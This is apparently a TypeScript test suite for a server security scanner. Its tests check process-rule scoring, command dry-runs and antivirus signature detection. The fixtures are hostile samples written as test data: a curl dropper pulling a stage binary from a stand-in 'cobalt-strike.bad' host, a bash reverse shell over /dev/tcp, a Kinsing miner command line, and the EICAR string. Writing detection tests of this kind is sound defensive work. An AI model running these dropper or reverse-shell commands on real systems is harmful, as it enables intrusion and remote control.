import test from "node:test";
import assert from "node:assert/strict";
import {
  evaluateProcessRules,
  evaluateCommandDryRun,
  scanBytesWithEngine,
  scanProcessForMalware,
  shouldPromoteToIncident,
  detectFileFormat,
  VIRUS_SIGNATURES,
} from "./server-security";

test("localhost curl with base64 string never flags as High or creates incident", () => {
  const procMap = new Map();
  procMap.set(100, { pid: 100, ppid: 1, uid: 1000, name: "bash", cmdline: ["bash"], exe: "/bin/bash" });
  const shProc = {
    pid: 101,
    ppid: 100,
    uid: 1000,
    name: "sh",
    cmdline: ["sh", "-c", "curl -s http://127.0.0.1:3000/api/ipc && echo c2NyaXB0 | base64 -d"],
    exe: "/bin/dash",
  };
  const anomaly = evaluateProcessRules(shProc, procMap);
  assert.equal(anomaly, null);
  assert.equal(shouldPromoteToIncident(anomaly), false);
});

test("loopback curl dry-run evaluates as suppressed/informational <= 10", () => {
  const res = evaluateCommandDryRun(
    {
      process_name: "curl",
      parent_name: "bash",
      cmdline: ["curl", "-s", "http://127.0.0.1:3000/api/ipc"],
      destination: "127.0.0.1",
      uid: 1000,
    },
    []
  );
  assert.ok(res.score <= 15);
  assert.equal(res.verdict, "suppressed");
  assert.equal(res.severity, "informational");
});

test("legitimate dev utilities and npm registry fetch score Clean/Suppressed", () => {
  const res = evaluateCommandDryRun(
    {
      process_name: "npm",
      parent_name: "bash",
      cmdline: ["npm", "install", "express"],
      destination: "registry.npmjs.org",
      uid: 1000,
    },
    []
  );
  assert.ok(res.score <= 15);
  assert.equal(res.verdict, "suppressed");
});

test("genuine external C2 dropper and reverse shell score High/Critical", () => {
  const c2 = evaluateCommandDryRun(
    {
      process_name: "curl",
      parent_name: "nginx",
      cmdline: ["curl", "-fsSL", "http://cobalt-strike.bad/stage.bin", "-o", "/dev/shm/.kworker"],
      destination: "cobalt-strike.bad",
      uid: 33,
    },
    []
  );
  assert.ok(c2.score >= 90);
  assert.equal(c2.severity, "critical");

  const procMap = new Map();
  const rev = evaluateProcessRules(
    {
      pid: 2222,
      ppid: 100,
      uid: 1000,
      name: "bash",
      cmdline: ["bash", "-i", ">&", "/dev/tcp/198.51.100.4/4444", "0>&1"],
      exe: "/bin/bash",
    },
    procMap
  );
  assert.ok(rev);
  assert.ok(rev.risk_score >= 90);
  assert.equal(shouldPromoteToIncident(rev), true);
});

test("antivirus detects EICAR and binary signatures while avoiding false positives on high-entropy ZIP/PNG", () => {
  // EICAR test pattern
  const eicarBuf = Buffer.from("X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*", "utf8");
  const eicarRes = scanBytesWithEngine("/tmp/eicar.com", eicarBuf, [], []);
  assert.equal(eicarRes.status, "infected");
  assert.equal(eicarRes.is_infected, true);

  // Simulated high-entropy PNG file (valid PNG header + pseudo-random compressed IDAT payload)
  const pngPayload = Buffer.alloc(4096);
  Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]).copy(pngPayload, 0);
  for (let i = 8; i < pngPayload.length; i++) {
    pngPayload[i] = (i * 131 + 17) & 0xff;
  }
  const fmt = detectFileFormat(pngPayload, "photo.png");
  assert.equal(fmt.isBenignCompressed, true);
  assert.equal(fmt.format, "PNG Image");

  const pngRes = scanBytesWithEngine("/tmp/photo.png", pngPayload, [], []);
  assert.equal(pngRes.status, "clean");
  assert.equal(pngRes.is_infected, false);

  // High-entropy packed ELF binary in /tmp should flag suspicious HEUR-ELF-001
  const elfPayload = Buffer.alloc(4096);
  Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0x02]).copy(elfPayload, 0);
  for (let i = 16; i < elfPayload.length; i++) {
    elfPayload[i] = (i * 197 + 73) & 0xff;
  }
  const elfRes = scanBytesWithEngine("/tmp/packed_dropper", elfPayload, [], []);
  assert.equal(elfRes.status, "suspicious");
  assert.equal(elfRes.rule_matched, "HEUR-ELF-001");
});

test("live process AV scanner catches Kinsing/Memfd/ReflectiveLoader and respects whitelists", () => {
  assert.ok(VIRUS_SIGNATURES.length >= 24);

  // Process running Kinsing miner cmdline
  const procVerdict = scanProcessForMalware(
    { pid: 4410, ppid: 1, uid: 1000, name: "sh", cmdline: ["sh", "-c", "/tmp/kdevtmpfsi --donate-level 1"], exe: "/bin/sh" },
    null,
    [],
    []
  );
  assert.ok(procVerdict);
  assert.equal(procVerdict.infected, true);
  assert.equal(procVerdict.rule, "AV-SIG-018");

  // Process binary containing ReflectiveLoader signature
  const infectedBin = Buffer.from("\x7fELF...ReflectiveLoader...payload", "latin1");
  const binVerdict = scanProcessForMalware(
    { pid: 4411, ppid: 1, uid: 1000, name: "agent", cmdline: ["/tmp/agent"], exe: "/tmp/agent" },
    infectedBin,
    [],
    []
  );
  assert.ok(binVerdict);
  assert.equal(binVerdict.infected, true);
  assert.equal(binVerdict.rule.startsWith("AV-SIG-016"), true);

  // Normal runtime binary containing '/proc/self/fd/' string in .rodata must NOT false-positive
  const bunBin = Buffer.from("\x7fELF...runtime-helper.../proc/self/fd/...", "latin1");
  const bunVerdict = scanProcessForMalware(
    { pid: 4412, ppid: 1, uid: 1000, name: "bun", cmdline: ["bun", "run", "dev"], exe: "/usr/local/bin/bun" },
    bunBin,
    [],
    []
  );
  assert.equal(bunVerdict, null);

  // Actual fileless process executing from /memfd: MUST be caught by AV-SIG-021
  const memfdVerdict = scanProcessForMalware(
    { pid: 4413, ppid: 1, uid: 1000, name: "kworker", cmdline: ["kworker"], exe: "/memfd:kworker (deleted)" },
    null,
    [],
    []
  );
  assert.ok(memfdVerdict);
  assert.equal(memfdVerdict.infected, true);
  assert.equal(memfdVerdict.rule, "AV-SIG-021");

  // Whitelisted developer binary must be exempted cleanly
  const whitelistedVerdict = scanProcessForMalware(
    { pid: 4411, ppid: 1, uid: 1000, name: "agent", cmdline: ["/tmp/agent"], exe: "/tmp/agent" },
    infectedBin,
    [{ id: "wl-1", name: "agent", path: "/tmp/agent" }],
    []
  );
  assert.equal(whitelistedVerdict, null);
});
